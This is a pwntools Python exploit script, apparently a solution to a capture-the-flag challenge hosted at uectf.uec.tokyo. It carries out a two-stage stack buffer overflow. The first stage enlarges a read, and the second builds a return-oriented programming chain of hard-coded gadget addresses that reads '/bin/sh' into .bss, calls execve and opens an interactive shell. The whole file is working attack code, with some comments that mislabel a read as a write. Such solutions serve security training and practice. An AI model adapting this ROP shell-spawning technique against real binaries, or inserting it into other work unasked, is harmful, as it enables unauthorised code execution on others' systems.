#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./chall"
#libc = ELF()
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("uectf.uec.tokyo", 9002)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		#b *vuln+51
        # ret
		#b *vuln+53
        # syscall
        b *0x487c09
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)

# stage 1
rop_pop_rdx_ret = 0x4017cf

payload = b'A' * 0x68
payload += p64(rop_pop_rdx_ret)
payload += p64(0x300)# write(0, &buf, 0x100)
payload += p64(elf.symbols['vuln'] +41)

p.recvuntil(">")
p.send(payload)

# stage 2
bss_addr = elf.get_section_by_name(".bss").header["sh_addr"]
rop_pop_rdi_ret = 0x49366d
rop_pop_rsi_ret = 0x4944d7
rop_pop_rax_ret = 0x484b2a
rop_pop_rbx_ret = 0x4949c9
rop_syscall_ret = 0x487c09
rop_syscall     = 0x4948be

payload = b'B' * 0x78
payload += p64(rop_pop_rdi_ret)
payload += p64(0x495004)# '>'
payload += p64(elf.symbols['puts'])
payload += p64(rop_pop_rax_ret)
payload += p64(0)
payload += p64(rop_pop_rdi_ret)
payload += p64(0)
payload += p64(rop_pop_rsi_ret)
payload += p64(bss_addr + 0x100)
payload += p64(rop_pop_rdx_ret)
payload += p64(0x8)
payload += p64(rop_syscall_ret)# write(0, &.bss+0x100, 0x8)
payload += p64(rop_pop_rax_ret)
payload += p64(59)
payload += p64(rop_pop_rdi_ret)
payload += p64(bss_addr + 0x100)
payload += p64(rop_pop_rsi_ret)
payload += p64(0)
payload += p64(rop_pop_rdx_ret)
payload += p64(0)
payload += p64(rop_syscall)# execve("/bin/sh")

p.send(payload)

# send /bin/sh
p.recvuntil('>')
p.send(b"/bin/sh\0")

p.interactive()
